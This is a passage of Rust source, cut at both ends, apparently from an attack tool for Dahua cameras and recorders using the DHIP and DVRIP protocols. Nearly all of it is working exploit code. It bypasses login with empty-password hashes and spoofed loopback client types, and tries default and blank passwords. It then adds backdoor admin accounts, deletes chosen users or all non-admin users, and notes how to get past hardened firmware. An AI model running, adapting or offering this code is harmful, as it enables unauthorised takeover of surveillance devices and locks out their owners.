        dhip_add_user_with_account(sock, pcp_session, &ctx.dhip, ctx.session_id, &pw_hash, args)
            .await;
    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
    result
}

/// Established DHIP session: DhipSession bound to the challenge realm plus the
/// logged-in session id.
struct DhipCtx {
    dhip: Arc<Mutex<DhipSession>>,
    session_id: u32,
}

/// Login over an already-challenged DHIP channel: real credentials first (when
/// --admin-pass given), then bypass combos. Returns the logged-in session.
async fn dhip_established_session(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    args: &Args,
    probe_timeout: Duration,
) -> Result<DhipCtx, String> {
    let dhip = Arc::new(Mutex::new(DhipSession::new(chal.realm_id)));
    let mut session_id = chal.session_id;
    {
        let mut d = dhip.lock().await;
        d.session_id = session_id;
    }

    // Login: try real credentials first (if --admin-pass given), then bypass
    let mut login_ok = false;
    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(
            &args.admin_user,
            &chal.realm,
            &chal.random,
            &args.admin_pass,
        );
        let login2 = json!({
            "id": 2, "magic": "0x1234", "method": "global.login",
            "params": {
                "userName": &args.admin_user, "password": pw_hash,
                "clientType": "Local", "ipAddr": "127.0.0.1",
                "loginType": "Loopback", "authorityType": "Default",
                "passwordType": "Default",
            },
            "session": session_id,
        });
        if let Some(t) =
            dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                        session_id = s as u32;
                        {
                            let mut d = dhip.lock().await;
                            d.session_id = session_id;
                        }
                    }
                    login_ok = true;
                    if args.verbose {
                        eprintln!("[debug] DHIP add login via password");
                    }
                } else if args.verbose {
                    eprintln!("[debug] DHIP real-password login rejected: {}", t);
                }
            }
        }
    }
    if !login_ok && args.try_defaults {
        // Factory default passwords (documented in Dahua manuals) with a REAL
        // login — succeeds on devices where the installer never changed it.
        for pw in DEFAULT_ADMIN_PASSWORDS {
            let pw_hash = password_hash(&args.admin_user, &chal.realm, &chal.random, pw);
            let login2 = json!({
                "id": 2, "magic": "0x1234", "method": "global.login",
                "params": {
                    "userName": &args.admin_user, "password": pw_hash,
                    "clientType": "Local", "ipAddr": "127.0.0.1",
                    "loginType": "Loopback", "authorityType": "Default",
                    "passwordType": "Default",
                },
                "session": session_id,
            });
            if let Some(t) =
                dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await
            {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                            session_id = s as u32;
                            {
                                let mut d = dhip.lock().await;
                                d.session_id = session_id;
                            }
                        }
                        login_ok = true;
                        println!("  [i] admin login OK with default password '{}'", pw);
                        break;
                    }
                    if args.verbose {
                        eprintln!("[debug] DHIP default password '{}' rejected: {}", pw, t);
                    }
                }
            }
        }
    }
    if !login_ok {
        let hash = empty_password_hash(&args.admin_user, &chal.realm, &chal.random);
        for (login_type, client_type, authority) in &[
            ("Loopback", "Local", "Admin"),
            ("Network", "InetWeb", "Admin"),
            ("Direct", "Web", "Admin"),
            ("Loopback", "Local", "Default"),
            ("Direct", "NetKeyboard", "Default"),
            ("Network", "InetWeb", "Default"),
        ] {
            let login2 = json!({
                "id": 2, "magic": "0x1234", "method": "global.login",
                "params": {
                    "userName": &args.admin_user, "password": hash,
                    "clientType": client_type, "ipAddr": "127.0.0.1",
                    "loginType": login_type, "authorityType": authority,
                    "passwordType": "Default",
                },
                "session": session_id,
            });
            if let Some(t) =
                dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await
            {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                            session_id = s as u32;
                            {
                                let mut d = dhip.lock().await;
                                d.session_id = session_id;
                            }
                        }
                        login_ok = true;
                        if args.verbose {
                            eprintln!(
                                "[debug] DHIP add login via {}/{} ({})",
                                client_type, login_type, authority
                            );
                        }
                        break;
                    }
                }
            }
        }
    }

    if !login_ok {
        return Err("DHIP bypass login failed".into());
    }
    Ok(DhipCtx { dhip, session_id })
}

/// Delete a user via DHIP binary protocol on the LIVE channel of an existing
/// challenge (no re-bind — same constraint as the add flow).

/// List ALL users over a DHIP session using the full fallback chain:
/// getUserInfoAll ({} then "null"), getUserList, then configManager.getConfig
/// on Account/account/UserManager/Security/System. Returns the parsed user
/// array and whether any source produced one. Needed on old firmware where
/// getUserInfoAll alone returns nothing.
async fn dhip_list_all_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    timeout: Duration,
    verbose: bool,
) -> (Vec<Value>, bool) {
    // Try userManager.getUserInfoAll with {} first ({"null"} can crash old firmware).
    let variants: &[(&str, Value)] = &[
        ("userManager.getUserInfoAll", json!({})),
        ("userManager.getUserInfoAll", json!("null")),
        ("userManager.getUserList", json!({})),
    ];
    // When the first getUserInfoAll probe goes silent (device answers nothing,
    // e.g. 4E06ED1PAZ71480 fw 5.2.1), the "null" variant will time out the same
    // way — skip it so the reliable getConfig(Account) fallback is reached
    // sooner instead of burning a second full timeout per call.
    let mut info_all_silent = false;
    for (method, params) in variants {
        if info_all_silent && *method == "userManager.getUserInfoAll" {
            continue;
        }
        let req = json!({"id": 10, "magic": "0x1234", "method": method,
            "params": params, "session": session_id});
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
            if verbose {
                eprintln!("[debug] DHIP {} response: {}", method, t);
            }
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    if !arr.is_empty() {
                        return (arr.clone(), true);
                    }
                } else if let Some(arr) = v.get("params").and_then(|p| p.as_array()) {
                    if !arr.is_empty() {
                        return (arr.clone(), true);
                    }
                }
            }
        } else if last_call_disc() {
            return (Vec::new(), false);
        } else if *method == "userManager.getUserInfoAll" {
            info_all_silent = true;
        }
    }

    // Fallback: configManager.getConfig on the Account table (works on old firmware).
    for cfg_name in &["Account", "account", "UserManager", "Security", "System"] {
        let req = json!({"id": 11, "magic": "0x1234", "method": "configManager.getConfig",
            "params": {"name": cfg_name}, "session": session_id});
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if verbose {
                    eprintln!("[debug] DHIP getConfig({}) response: {}", cfg_name, v);
                }
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    if let Some(table) = v.get("params").and_then(|p| p.get("table")) {
                        if let Some(users) = table.get("User").and_then(|u| u.as_array()) {
                            if !users.is_empty() {
                                return (users.clone(), true);
                            }
                        } else if let Some(users) = table.get("user").and_then(|u| u.as_array()) {
                            if !users.is_empty() {
                                return (users.clone(), true);
                            }
                        }
                    }
                }
            }
        } else if last_call_disc() {
            return (Vec::new(), false);
        }
    }

    (Vec::new(), false)
}

async fn dhip_try_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };
    let dhip = &ctx.dhip;
    let session_id = ctx.session_id;
    let realm_id = chal.realm_id;

    let timeout = args.timeout_or(5);
    let mut result = Err("DHIP deleteUser failed".into());

    let mut name = user_name.clone();
    let (users, listed) =
        dhip_list_all_users(sock, pcp_session, &dhip, session_id, timeout, args.verbose).await;
    if let Some(obj) = users.iter().find(|u| {
        if let Some(n) = &name {
            u.get("Name").and_then(|x| x.as_str()).unwrap_or("") == n
        } else {
            u.get("Id").and_then(|x| x.as_u64()).unwrap_or(0) as u32 == user_id.unwrap_or(0)
        }
    }) {
        name = obj
            .get("Name")
            .and_then(|n| n.as_str())
            .map(|s| s.to_string());
    }
    let found_in_list = listed
        && users.iter().any(|u| {
            if let Some(n) = &name {
                u.get("Name").and_then(|x| x.as_str()).unwrap_or("") == n
            } else {
                u.get("Id").and_then(|x| x.as_u64()).unwrap_or(0) as u32 == user_id.unwrap_or(0)
            }
        });
    let user_id = user_id.unwrap_or(0);
    if args.verbose {
        eprintln!(
            "[debug] DHIP delete resolved name: {:?} (listed={})",
            name, listed
        );
    }
    if !listed && user_name.is_none() {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("getUserInfoAll: no/invalid response — device never listed users".into());
    }
    // Fail-fast: la lista è stata letta con successo ma l'utente NON compare (es.
    // `6B003ACPAZ64EDE` ha decine di utenti ma manca l'Id richiesto) — inutile provare
    // le varianti deleteUser: con nome nullo il device risponde 268894211 per tutte.
    if listed && !found_in_list {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err(if user_name.is_some() {
            format!(
                "user '{}' not found on device (user list queried ok) — aborting delete",
                user_name.unwrap_or_default()
            )
        } else {
            format!(
                "user Id={} not found on device (user list queried ok) — aborting delete",
                user_id
            )
        });
    }

    let variant_shapes: Vec<Value> = vec![
        json!({"name": name.as_deref().unwrap_or("")}),
        json!({"user": {"Id": user_id, "Name": name.as_deref().unwrap_or("")}}),
        json!({"user": {"Id": user_id}}),
        json!({"user": {"Name": name.as_deref().unwrap_or("")}}),
        json!({"user": {"Id": user_id, "Name": name.as_deref().unwrap_or("")}, "id": user_id}),
        json!({"Id": user_id, "Name": name.as_deref().unwrap_or("")}),
    ];
    for params in variant_shapes {
        let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.deleteUser",
            "params": params, "session": session_id});
        if args.verbose {
            eprintln!("[debug] DHIP deleteUser: {}", req);
        }
        if let Some(t) = dhip_call(sock, pcp_session, &dhip, &req.to_string(), timeout).await {
            match serde_json::from_str::<Value>(&t) {
                Ok(v) => {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        println!(
                            "  [+] user Id={} ({}) deleted via DHIP",
                            user_id,
                            name.as_deref().unwrap_or("?")
                        );
                        result = Ok(());
                        break;
                    }
                    if args.verbose {
                        eprintln!("[debug] DHIP deleteUser failed: {}", t);
                    }
                }
                Err(_) => {
                    if args.verbose {
                        eprintln!("[debug] DHIP deleteUser: non-JSON response: {}", t);
                    }
                }
            }
        } else if args.verbose {
            eprintln!("[debug] DHIP deleteUser: no response (channel likely dead)");
        }
    }

    let _ = dhip_call(sock, pcp_session, &dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Delete ALL users except the admin (Id 2 / name "admin") over the DHIP session.
/// Lists users via getUserInfoAll, then deletes each non-admin user by name.
async fn dhip_try_delete_all(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };
    let dhip = &ctx.dhip;
    let session_id = ctx.session_id;
    let realm_id = chal.realm_id;

    let timeout = args.timeout_or(5);

    // List all users (full fallback chain: getUserInfoAll, getUserList, getConfig Account).
    let (users, listed) =
        dhip_list_all_users(sock, pcp_session, &dhip, session_id, timeout, args.verbose).await;
    if !listed {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("getUserInfoAll: no/invalid response — device never listed users".into());
    }

    // Collect targets: everything except admin (Id==2 or name=="admin", case-insensitive).
    let admin_id = 2u32;
    let targets: Vec<(u32, String)> = users
        .iter()
        .filter_map(|u| {
            let id = u
                .get("Id")
                .and_then(|x| x.as_u64())
                .map(|v| v as u32)
                .unwrap_or(0);
            let nm = u
                .get("Name")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string();
            let is_admin = id == admin_id || nm.eq_ignore_ascii_case("admin");
            if is_admin {
                None
            } else {
                Some((id, nm))
            }
        })
        .collect();

    if targets.is_empty() {
        println!("  [!] no non-admin users found on device — nothing to delete");
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Ok(());
    }
    println!("  [*] deleting {} user(s) (keeping admin)", targets.len());

    let mut deleted = 0usize;
    let mut failed = 0usize;
    for (id, nm) in &targets {
        let variant_shapes: Vec<Value> = vec![
            json!({"name": nm}),
            json!({"user": {"Id": id, "Name": nm}}),
            json!({"user": {"Id": id}}),
            json!({"user": {"Name": nm}}),
            json!({"user": {"Id": id, "Name": nm}, "id": id}),
            json!({"Id": id, "Name": nm}),
        ];
        let mut ok_this = false;
        for params in variant_shapes {
            let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.deleteUser",
                "params": params, "session": session_id});
            if args.verbose {
                eprintln!("[debug] DHIP deleteUser: {}", req);
            }
            if let Some(t) = dhip_call(sock, pcp_session, &dhip, &req.to_string(), timeout).await {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        ok_this = true;
                        break;
                    }
                }
            } else if last_call_disc() {
                break;
            }
        }
        if ok_this {
            println!("  [+] user Id={} ({}) deleted via DHIP", id, nm);
            deleted += 1;
        } else {
            eprintln!("  [-] user Id={} ({}) delete failed", id, nm);
            failed += 1;
        }
        if last_call_disc() {
            eprintln!(
                "  [!] device sent DISC — stopping early ({} deleted, {} failed)",
                deleted, failed
            );
            break;
        }
    }

    let _ = dhip_call(sock, pcp_session, &dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;

    if failed > 0 {
        Err(format!(
            "delete-all: {} deleted, {} failed",
            deleted, failed
        ))
    } else {
        println!("  [+] all {} non-admin user(s) deleted", deleted);
        Ok(())
    }
}

/// DHIP addUser + configManager.setConfig (Account table with plaintext password).
async fn dhip_add_user_with_account(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    pw_hash: &str,
    args: &Args,
) -> Result<(), String> {
    let timeout = args.timeout_or(10);

    // If the user already exists there is nothing to do. Check BEFORE the
    // addUser attempts, while the session is still healthy: on some devices
    // (e.g. 4E06ED1PAZ71480, fw 5.2.1) a duplicate addUser fails with a generic
    // "Unknown error" (268959743) AND degrades the channel so that neither
    // getUserInfoAll nor getConfig(Account) answer afterwards. The duplicate was
    // therefore misreported as a hard FAIL that then fell through to the HTTP
    // fallback and surfaced as a bogus "HTTP login challenge timeout".
    let (listed, existing) =
        dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await;
    if listed && existing.get("Name").and_then(|n| n.as_str()) == Some(args.user.as_str()) {
        println!(
            "  [!] user '{}' already exists on device, skipping",
            &args.user
        );
        return Ok(());
    }

    // Query device's supported authority list
    let authority_list =
        dhip_get_authority_list(sock, pcp_session, dhip, session_id, timeout).await;

    let group = if args.group == "user" {
        "user"
    } else {
        "admin"
    };
    let authority_list: Vec<String> = if group == "user" {
        authority_list
            .into_iter()
            .filter(|a| a.starts_with("Monitor") || a.starts_with("Replay"))
            .collect()
    } else {
        authority_list
    };
    let types: &[&str] = if group == "user" {
        &["Normal"]
    } else {
        &["Admin", "Operator", "Normal"]
    };

    let mut all_same_code = true;
    let mut first_code: i64 = 0;
    let mut last_err = String::new();
    let mut answered = 0usize;

    for utype in types {
        let al = authority_list.clone();
        let user_obj = json!({
            "Name": &args.user, "Password": pw_hash,
            "Group": group, "Memo": &args.memo, "Type": utype,
            "passwordType": "Default",
            "AuthorityList": al,
        });
        let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.addUser",
            "params": {"user": user_obj}, "session": session_id});
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
            answered += 1;
            if args.verbose {
                eprintln!("[debug] DHIP addUser(Type={}) response: {}", utype, t);
            }
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    println!("  [+] user added via DHIP (Type={})", utype);
                    let set_params = json!({"name": "Account", "table": {"User": [{
                        "Name": &args.user, "Password": &args.password,
                        "Group": group, "Memo": &args.memo, "Type": utype,
                        "passwordType": "Default",
                        "AuthorityList": authority_list,
                    }]}});
                    let set_req = json!({"id": 220, "magic": "0x1234", "method": "configManager.setConfig",
                        "params": set_params, "session": session_id});
                    if let Some(t) =
                        dhip_call(sock, pcp_session, dhip, &set_req.to_string(), timeout).await
                    {
                        if t.contains("result\":true") {
                            println!("  [+] Account table updated with plaintext password");
                        }
                    }
                    return Ok(());
                }
                let err_str = v
                    .get("error")
                    .and_then(|e| e.get("message"))
                    .and_then(|m| m.as_str())
                    .unwrap_or("");
                if err_str.to_lowercase().contains("exist") || t.to_lowercase().contains("exist") {
                    println!(
                        "  [!] user '{}' already exists on device, skipping",
                        &args.user
                    );
                    return Ok(());
                }
                let code = v
                    .get("error")
                    .and_then(|e| e.get("code"))
                    .and_then(|c| c.as_i64())
                    .unwrap_or(0);
                let msg = v
                    .get("error")
                    .and_then(|e| e.get("message"))
                    .and_then(|m| m.as_str())
                    .unwrap_or("");
                if !last_err.is_empty() {
                    last_err.push_str("; ");
                }
                last_err.push_str(&format!("Type={} code={} '{}'", utype, code, msg));
                if *utype == "Admin" {
                    first_code = code;
                } else if code != first_code {
                    all_same_code = false;
                }
            }
        }
    }

    if args.verbose {
        eprintln!(
            "[debug] DHIP addUser all_same_code={} first_code={}",
            all_same_code, first_code
        );
    }

    // Extra variant: MINIMAL user object — some firmwares choke (silently drop
    // the channel) on unexpected fields like CtrPanel/ShutDown authorities and
    // answer to a bare Name/Password/Group/Type request instead.
    if answered == 0 {
        for utype in ["Admin", "Normal"] {
            let user_obj = json!({
                "Name": &args.user, "Password": pw_hash,
                "Group": group, "Type": utype,
                "passwordType": "Default",
                "AuthorityList": ["Monitor"],
            });
            let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.addUser",
                "params": {"user": user_obj}, "session": session_id});
            if args.verbose {
                eprintln!("[debug] DHIP addUser(minimal Type={}) request", utype);
            }
            if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
                answered += 1;
                if args.verbose {
                    eprintln!(
                        "[debug] DHIP addUser(minimal Type={}) response: {}",
                        utype, t
                    );
                }
                if t.contains("result\":true") {
                    println!(
                        "  [+] user added via DHIP (minimal payload, Type={})",
                        utype
                    );
                    return Ok(());
                }
                if !last_err.is_empty() {
                    last_err.push_str("; ");
                }
                last_err.push_str(&format!(
                    "minimal Type={} → {}",
                    utype,
                    t.replace('\n', " ")
                ));
            }
        }
    }

    // Last resort: write the Account table directly. On some firmwares
    // configManager.setConfig is allowed where userManager.addUser is blocked.
    {
        let set_params = json!({"name": "Account", "table": {"User": [{
            "Name": &args.user, "Password": &args.password,
            "Group": group, "Memo": &args.memo, "Type": "Normal",
            "passwordType": "Default",
            "AuthorityList": authority_list,
        }]}});
        let set_req = json!({"id": 220, "magic": "0x1234", "method": "configManager.setConfig",
            "params": set_params, "session": session_id});
        if args.verbose {
            eprintln!("[debug] DHIP setConfig(Account) fallback");
        }
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &set_req.to_string(), timeout).await {
            // IMPORTANT: `result:true` here does NOT guarantee the user was added.
            // Some devices (e.g. full account table / max-user limit) accept the
            // setConfig but silently ignore the new user. Always confirm the user
            // really exists via getUserInfoAll before declaring OK.
            if t.contains("result\":true") {
                let (listed, found) =
                    dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await;
                if listed && found.get("Name").and_then(|n| n.as_str()) == Some(args.user.as_str()) {
                    if args.verbose {
                        eprintln!("[debug] confirmed via getUserInfoAll");
                    }
                    println!(
                        "  [+] user written via configManager.setConfig (Account table, confirmed)"
                    );
                } else {
                    if args.verbose {
                        eprintln!(
                            "[debug] setConfig returned true but user NOT found via getUserInfoAll"
                        );
                    }
                    println!("  [!] setConfig accepted the write but the user is NOT in the account table");
                    println!(
                        "  [!] a likely cause is that the device reached its maximum number of users \
                         (addUser failed with code 615). Delete an existing user and retry."
                    );
                    return Err(
                        "addUser failed: device did not add user (max users reached, code 615?)"
                            .to_string(),
                    );
                }
                return Ok(());
            }
            let code = serde_json::from_str::<Value>(&t).ok().and_then(|v| {
                v.get("error")
                    .and_then(|e| e.get("code"))
                    .and_then(|c| c.as_i64())
            });
            if code == Some(615) {
                println!("  [!] device reports max user limit reached (code 615)");
                return Err("addUser failed: maximal number of users reached on device".to_string());
            }
            if args.verbose {
                eprintln!("[debug] DHIP setConfig(Account) response: {}", t);
            }
        } else if args.verbose {
            eprintln!("[debug] DHIP setConfig(Account): no response");
        }
    }

    // Do NOT guess "already exists" from the error code alone: on some devices a
    // brand-new user also fails with the same error (e.g. 268632079). Confirm the
    // user is really present via the full account-table fallback prior to
    // declaring it a duplicate.
    let (listed, found) =
        dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await;
    if listed && found.get("Name").and_then(|n| n.as_str()) == Some(args.user.as_str()) {
        println!(
            "  [!] user '{}' already exists on device, skipping",
            &args.user
        );
        return Ok(());
    }

    // Hardened firmware signature #1: the bypass session can read but account
    // management is rejected with "Component error: login challenge!".
    if last_err.contains("268632079") || last_err.to_lowercase().contains("login challenge") {
        return Err(format!(
            "all DHIP addUser variants failed [{}] — hardened firmware: add requires a real authenticated session, retry with --admin-pass or --try-defaults",
            last_err
        ));
    }
    // Hardened firmware signature #2: the device goes SILENT on addUser from a
    // bypass session (drops the channel instead of answering, e.g. 2L05BD6PAZ00030).
    if answered == 0 && last_err.is_empty() {
        let hint = if args.admin_pass.is_empty() {
            "device never answered any addUser — hardened firmware likely drops bypass sessions; retry with -p <admin password> or --try-defaults"
        } else {
            "device never answered any addUser even with admin credentials — check credentials or device state"
        };
        return Err(format!("all DHIP addUser variants failed: {}", hint));
    }
    Err(format!("all DHIP addUser variants failed [{}]", last_err))
}

/// Check whether a user name exists, via the same full fallback chain as
/// `dhip_list_all_users` (getUserInfoAll → getUserList → getConfig(Account)).
/// On some devices (e.g. 4E06ED1PAZ71480, fw 5.2.1) `getUserInfoAll` is silent
/// while `configManager.getConfig name="Account"` returns the account table, so
/// relying on getUserInfoAll alone made duplicate detection always return false.
async fn dhip_user_exists(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    name: &str,
    timeout: Duration,
) -> (bool, Value) {
    let (users, listed) =
        dhip_list_all_users(sock, pcp_session, dhip, session_id, timeout, false).await;
    let found = users
        .iter()
        .find(|u| u.get("Name").and_then(|n| n.as_str()) == Some(name))
        .cloned()
        .unwrap_or(Value::Null);
    (listed, found)
}

/// DHIP getAuthorityList — queried from device, with Smart Manager fallback.
async fn dhip_get_authority_list(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    timeout: Duration,
) -> Vec<String> {
    let req = json!({"id": 101, "magic": "0x1234", "method": "userManager.getAuthorityList",
        "params": {}, "session": session_id});
    if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
        if let Ok(v) = serde_json::from_str::<Value>(&t) {
            if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                    let list: Vec<String> = params
                        .iter()
                        .filter_map(|s| s.as_str().map(String::from))
                        .collect();
                    if !list.is_empty() {
                        return list;
                    }
                }
            }
        }
    }
    // Fallback: Smart Manager authority list from sniff log analysis
    default_authority_list()
}

/// Smart Manager authority list used when the device does not answer
/// `userManager.getAuthorityList` (sniff log analysis).
fn default_authority_list() -> Vec<String> {
    vec![
        "Monitor".into(),
        "Monitor_01".into(),
        "Monitor_02".into(),
        "Monitor_03".into(),
        "Monitor_04".into(),
        "Replay".into(),
        "Replay_01".into(),
        "Replay_02".into(),
        "Replay_03".into(),
        "Replay_04".into(),
        "AuthUserMag".into(),
        "AuthSysCfg".into(),
        "AuthSysInfo".into(),
        "AuthManuCtr".into(),
        "AuthStoreCfg".into(),
        "AuthEventCfg".into(),
        "AuthNetCfg".into(),
        "AuthRmtDevice".into(),
        "AuthSecurity".into(),
        "AuthBackup".into(),
        "AuthMaintence".into(),
    ]
}

/// Add a user over the old-style DVRIP binary dialect on the SDK port (37777).
/// Used for firmware that never answers DHIP `global.login` (e.g. China-market
/// devp2p 6.7.5). Binds a realm, logs in with the device admin credentials, then
/// sends `userManager.addUser` (+ `configManager.setConfig` on the Account
/// table) as DVRIP `f6` JSON frames. The stored HA1 is
/// `MD5(user:<dvrip challenge realm>:password)`, same SmartPSS-compatible format
/// as the DHIP path.
async fn sdk_dvrip_add_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    args: &Args,
) -> Result<(), String> {
    // Device-side admin credentials, tried like the SDK snapshot flow.
    let mut creds: Vec<(String, String)> = Vec::new();
    if !args.admin_pass.is_empty() {
        creds.push((args.admin_user.clone(), args.admin_pass.clone()));
    }
    if args.try_defaults {
        for pw in DEFAULT_ADMIN_PASSWORDS {
            if args.admin_pass == *pw {
                continue;
            }
            creds.push((args.admin_user.clone(), (*pw).to_string()));
        }
    }
    // last resort: blank password (devices never configured by an installer)
    if args.admin_pass.is_empty() {
        creds.push((args.admin_user.clone(), String::new()));
    }

    let mut last_err = "DVRIP login failed".to_string();
    for (auser, apass) in &creds {
        let client = sdk::SdkClient::new(auser, apass).with_verbose(args.verbose);
        let (realm_id, sid, chal_realm) = match client.dvrip_open(sock, pcp_session).await {
            Ok(v) => v,
            Err(e) => {
                last_err = format!("DVRIP login failed: {}", e.describe());
                if args.verbose {
                    eprintln!("  [debug] DVRIP login ({}) rejected: {}", auser, e.describe());
                }
                if e.should_abort() {
                    eprintln!(
                        "  [!] aborting DVRIP login: {} (further attempts would lock the account)",
                        e.describe()
                    );
                    return Err(last_err);
                }
                continue;
            }
        };
        if args.verbose {
            eprintln!(
                "  [debug] DVRIP login ok (realm={} sid={} chal='{}')",
                realm_id, sid, chal_realm
            );
        }

        // Duplicate pre-check while the session is healthy.
        let list_req = json!({"id": 100, "method": "userManager.getUserInfoAll",
            "params": {}, "session": sid});
        if let Some(t) = client
            .dvrip_call(sock, pcp_session, realm_id, sid, 100, &list_req.to_string())
            .await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if let Some(users) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    if users
                        .iter()
                        .any(|u| u.get("Name").and_then(|n| n.as_str()) == Some(args.user.as_str()))
                    {
                        println!(
                            "  [!] user '{}' already exists on device, skipping",
                            &args.user
                        );
                        return Ok(());
                    }
                }
            }
        }

        // Authority list (fall back to the sniffed Smart Manager list).
        let al_req = json!({"id": 101, "method": "userManager.getAuthorityList",
            "params": {}, "session": sid});
        let mut authority_list: Vec<String> = Vec::new();
        if let Some(t) = client
            .dvrip_call(sock, pcp_session, realm_id, sid, 101, &al_req.to_string())
            .await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if let Some(arr) = v.get("params").and_then(|p| p.as_array()) {
                    authority_list = arr
                        .iter()
                        .filter_map(|s| s.as_str().map(String::from))
                        .collect();
                }
            }
        }
        if authority_list.is_empty() {
            authority_list = default_authority_list();
        }

        let group = if args.group == "user" { "user" } else { "admin" };
        let authority_list: Vec<String> = if group == "user" {
            authority_list
                .into_iter()
                .filter(|a| a.starts_with("Monitor") || a.starts_with("Replay"))
                .collect()
        } else {
            authority_list
        };
        let types: &[&str] = if group == "user" {
            &["Normal"]
        } else {
            &["Admin", "Operator", "Normal"]
        };

        let pw_hash = http_adduser_password_hash(&args.user, &chal_realm, &args.password);

        for utype in types {
            let user_obj = json!({
                "Name": &args.user, "Password": pw_hash,
                "Group": group, "Memo": &args.memo, "Type": utype,
                "passwordType": "Default",
                "AuthorityList": authority_list.clone(),
            });
            let req = json!({"id": 100, "method": "userManager.addUser",
                "params": {"user": user_obj}, "session": sid});
            match client
                .dvrip_call(sock, pcp_session, realm_id, sid, 100, &req.to_string())
                .await
            {
                Some(t) => {
                    if args.verbose {
                        eprintln!("[debug] DVRIP addUser(Type={}) response: {}", utype, t);
                    }
                    if let Ok(v) = serde_json::from_str::<Value>(&t) {
                        if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                            println!("  [+] user added via DVRIP (Type={})", utype);
                            let set_params = json!({"name": "Account", "table": {"User": [{
                                "Name": &args.user, "Password": &args.password,
                                "Group": group, "Memo": &args.memo, "Type": utype,
                                "passwordType": "Default",
                                "AuthorityList": authority_list,
                            }]}});
                            let set_req = json!({"id": 220, "method": "configManager.setConfig",
                                "params": set_params, "session": sid});
                            if let Some(t2) = client
                                .dvrip_call(
                                    sock,
                                    pcp_session,
                                    realm_id,
                                    sid,
